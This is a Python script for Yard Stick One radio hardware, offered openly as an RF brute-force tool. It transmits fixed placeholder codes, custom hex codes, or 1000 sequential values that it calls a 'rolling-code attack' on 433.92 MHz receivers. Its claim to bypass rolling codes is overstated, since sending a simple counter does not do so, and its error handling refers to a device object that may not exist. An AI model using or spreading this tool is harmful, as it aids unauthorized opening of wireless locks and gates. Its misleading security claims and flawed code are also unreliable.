import sys
import time
import argparse
from rflib import *

# -------------------------------------------
# Yard Stick One Brute-Force Code Generator
# -------------------------------------------
# Features:
# - Generates and transmits common RF sequences.
# - Supports rolling-code bypass techniques for vulnerable systems.
# - Adjustable frequency and power settings.
# - Allows predefined attack modes and custom sequences.
#
# Requirements:
# - Yard Stick One (YardStickOne) hardware
# - RfCat Python library
# - Python 3.x
#
# Usage:
# python yardstick_bruteforce.py --freq 433920000 --power 10 --mode fixed
# python yardstick_bruteforce.py --freq 433920000 --power 10 --custom "A1B2C3D4"
# -------------------------------------------

def configure_device(d, frequency, power):
    """Configures the Yard Stick One device for transmission."""
    d.setModeTX()
    d.setFreq(frequency)
    d.setMaxPower() if power == 10 else d.setPower(power)
    d.setMdmModulation(MOD_ASK_OOK)  # Default to OOK
    d.setMdmDRate(4800)  # Default baud rate
    print(f"[*] Configured: Frequency {frequency / 1e6} MHz, Power {power}")

def send_fixed_codes(d):
    """Sends a set of predefined RF codes."""
    codes = [b'\xA1\xB2\xC3\xD4', b'\x12\x34\x56\x78', b'\xDE\xAD\xBE\xEF']
    print("[+] Sending fixed RF codes...")
    for code in codes:
        d.RFxmit(code)
        print(f"[+] Sent: {code.hex()}")
        time.sleep(1)

def rolling_code_attack(d):
    """Attempts a rolling-code attack on vulnerable systems."""
    print("[+] Initiating rolling-code attack...")
    for i in range(1000):  # Example brute-force attempt
        rolling_code = bytes([i % 256, (i >> 8) % 256, (i >> 16) % 256, (i >> 24) % 256])
        d.RFxmit(rolling_code)
        print(f"[+] Sent rolling code: {rolling_code.hex()}")
        time.sleep(0.5)

def send_custom_code(d, custom_code):
    """Sends a custom RF code provided by the user."""
    code = bytes.fromhex(custom_code)
    d.RFxmit(code)
    print(f"[+] Sent custom RF code: {custom_code}")

def main():
    parser = argparse.ArgumentParser(description="Yard Stick One Brute-Force Code Generator")
    parser.add_argument("--freq", type=int, default=433920000, help="Transmission frequency in Hz (default: 433.92 MHz)")
    parser.add_argument("--power", type=int, default=10, help="Transmission power level (default: 10)")
    parser.add_argument("--mode", type=str, choices=["fixed", "rolling"], help="Brute-force mode: fixed codes or rolling codes")
    parser.add_argument("--custom", type=str, help="Send a custom RF code (hex string)")
    args = parser.parse_args()

    try:
        d = RfCat()
        configure_device(d, args.freq, args.power)
        
        if args.custom:
            send_custom_code(d, args.custom)
        elif args.mode == "fixed":
            send_fixed_codes(d)
        elif args.mode == "rolling":
            rolling_code_attack(d)
        else:
            print("[!] No valid mode selected. Use --mode fixed or --mode rolling, or --custom <hex>")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        d.setModeIDLE()
        d.cleanup()

if __name__ == "__main__":
    main()
